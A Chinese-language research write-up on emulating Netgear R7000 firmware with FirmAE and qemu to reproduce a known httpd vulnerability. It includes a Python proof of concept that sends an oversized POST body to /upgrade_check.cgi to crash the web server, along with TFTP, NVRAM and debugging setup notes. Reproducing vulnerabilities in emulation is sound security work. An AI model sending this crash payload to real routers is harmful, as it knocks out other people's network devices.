参考于文章[复现影响79款Netgear路由器高危漏洞](https://blog.csdn.net/q759451733/article/details/114459181)，但原文章是基于真实设备做的，这里尝试采用模拟的方式。

刚开始尝试qemu用户仿真，会报错说`libbdbroker.so`找不到
```
$ sudo chroot . ./qemu-arm-static /usr/sbin/httpd -S -E /usr/sbin/ca.pem /usr/sbin/httpsd.pem
/usr/sbin/httpd: can't load library 'libbdbroker.so'
```

然后去文件系统中找，这里会出现各种各种符号链接，但是是坏的，在提取的文件系统里确实找不到这个`libbdbroker.so`文件，这应该是路由器启动过程中动态生成的文件。

于是尝试使用FirmAE进行仿真，可以成功仿真！
```
sudo ./run.sh -d Netgear /home/iot/Desktop/firmware/Netgear/R7000-V1.0.11.100_10.2.100/R7000-V1.0.11.100_10.2.100.chk
```

![](images/Pasted%20image%2020230918224258.png)

通过debug模式进入shell，在FirmAE仿真的文件系统里可以找到`libbdbroker.so`文件，并且运行poc代码可以让http服务崩溃。
```python
# poc.py
import socket

ip = '192.168.1.1'
port = 80
argument_name = b"mtenFWUpload"

def send_plain(ip, port, payload):
	sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	sock.connect((ip, port))
	sock.send(payload)
	print(sock.recv(4096))
	sock.close()

data = b""
data += b"*#$^\x00" # marker
data += b"\x00\x04\x00" # size
data += b"A" * 0x400

payload = b''
payload += b'POST /upgrade_check.cgi HTTP/1.1\r\n'
payload += b'Host: 192.168.1.1\r\n'
payload += b'Content-Disposition: AAAA\r\n'
payload += b'Content-Length: 1024\r\n'
payload += b'Content-Type: application/octet-stream\r\n'
payload += b'name="mtenFWUpload"\r\n'
payload += b'\r\n'
payload += data

print(payload)

send_plain(ip, port, payload)

```

由于项目需要，要尝试将httpd程序通过用户仿真方式跑起来并能够触发崩溃，查看固件支持的命令发现支持tftp，于是在主机搭建tftp服务器，把缺少的`libbdbroker.so`文件拷贝出来再尝试运行。
## 搭建tftp服务器

在ubuntu主机上安装服务端
```
sudo apt-get install tftpd-hpa
```

创建tftp服务器目录
```
cd /home/iot/Desktop
mkdir tftp_share
```

配置tftp服务器
```
sudo vim /etc/default/tftpd-hpa
```

将内容更改为如下内容：
```
TFTP_USERNAME="tftp"
TFTP_DIRECTORY="/home/iot/Desktop/tftp_share"
TFTP_ADDRESS=":69"
TFTP_OPTIONS="-l -c -s"
```

重启tftp服务
```
sudo service tftpd-hpa restart
```

在FirmAE跑起来的固件环境shell中运行tftp命令传输文件
```
tftp -l /tmp/media/nand/bitdefender/patches/base/lib/libbdbroker.so -r libbdbroker.so  -p 192.168.1.2 69
```

然后在tftp配置的目录下就可以找到相应的文件。

将`libbdbroker.so`文件放在lib目录下，然后再以用户仿真运行httpd程序，这次报`/var/run/httpd.pid: No such file or directory`，原因是缺少相应的目录，创建对应目录即可。提取的文件系统var指向tmp/var（不存在），所以递归创建目录`tmp/var/run`，然后再运行。

这次就开始报`/dev/nvram: No such file or directory`，这是因为没有配置nvram，可以安装firmadyne项目中提供的方法进行配置。

## nvram配置
根据[firmadyne/libnvram: NVRAM emulator (github.com)](https://github.com/firmadyne/libnvram) 中Usage的描述，下载arm版本的release，将`libnvram.so`覆盖原来的文件`usr/sbin/libnvram.so`，在文件系统根目录创建目录
```
mkdir -p firmadyne/libnvram/
mkdir -p firmadyne/libnvram.override/
```

然后重新启动httpd程序，nvram问题解决了，但是又崩了。。

![](images/Pasted%20image%2020230919113506.png)

没找出原因在哪儿，放弃。ps.尝试通过greenhouse工具跑该固件，但是跑完后没有结果。

## 全系统仿真
前面没跑通，后来又尝试全系统模式仿真，测试发现上面的问题是因为NVRAM的值（`gui_region`）没有设置，需要设置它的值才能继续跑下去，但是后面还有很多NVRAM的值需要设置，暂时还是没跑起来，记录一下全系统仿真时的脚本。

```
qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append "root=/dev/mmcblk0p2" -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic

./gdbserver-7.7.1-armel-v1 192.168.2.2:1234 usr/sbin/httpd -S -E /usr/sbin/ca.pem /usr/sbin/httpsd.pem
```